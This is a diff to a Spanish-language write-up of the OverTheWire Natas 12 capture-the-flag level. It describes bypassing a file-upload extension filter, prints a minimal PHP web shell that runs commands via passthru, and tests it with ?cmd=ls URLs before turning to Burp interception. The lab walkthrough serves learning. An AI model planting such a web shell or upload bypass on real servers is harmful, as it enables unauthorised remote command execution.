@@ -102,7 +102,54 @@ Intentamos subir un fichero pero nos da un error probablemente relacionado con e
 There was an error uploading the file, please try again!
 ```
 
-Utiulizamos las **herramientas del desarrollador** que trae **Google Chrome** para editar algunos campos ocultos que  
+Parece que esta prueba trata de subir un fichero, en principio un **JPG**, que nos permita obtener la contraseña del reto. 
+
+También hemos pensado que podemos **engañar** al sistema subiendo un fichero **php** con terminación en **JPG**. 
+
+Algo así como esto:
+
+```php
+phpShell.php.jpg
+```
+
+El programa solamente mirará si la extensión del fichero es **JPG** y lo subirá la servidor.
+
+Programamos una **Shell** en **PHP** muy sencilla que nos permitirá lanzar comandos en el servidor
+
+```php
+<?php
+ passthru($_GET['cmd']);  
+?>
+```
+
+Lo guardamos como **cmdShell.php.jpg** con un tamaño de **35bytes** y lo intentamos subir. 
+
+Con esto estaríamos pasando el filtro del **Tamaño* y el filtro de la **Extensión**
+
+Pulsamos el botón de subir y nos sale este mensaje:
+
+```html
+The file upload/28plb5h3bh.jpg has been uploaded
+```
+
+Accedemos a la dirección y efectivamente tenemos nuestro objeto subido. Le intentamos cambiar la extensión a **.php** e introducirle algun comando, pero no responde.
+
+```html
+http://natas12.natas.labs.overthewire.org/upload/28plb5h3bh.jpg?cmd=ls 
+```
+
+ni tampoco con
+
+```html
+http://natas12.natas.labs.overthewire.org/upload/28plb5h3bh.php?cmd=ls 
+```
+
+Volvemos a leer el código fuente y nos damos cuenta que las funciones **makeRandomPathFromFilename** y **makeRandomPath** eliminan todo el texto anterior a la extensión **jpg**
+
+Tenemos que conseguir **interceptar** el contenido que se envia y cambiarle la extensión a **.php** una vez que ha pasado el filtro de comprobación **jpg**
+
+Para ello vamos a utilizar la herramienta **BURP** que podemos encontrar en la distro de Linux para **Pentesting** - **Kali Linux**
+
 
 
 
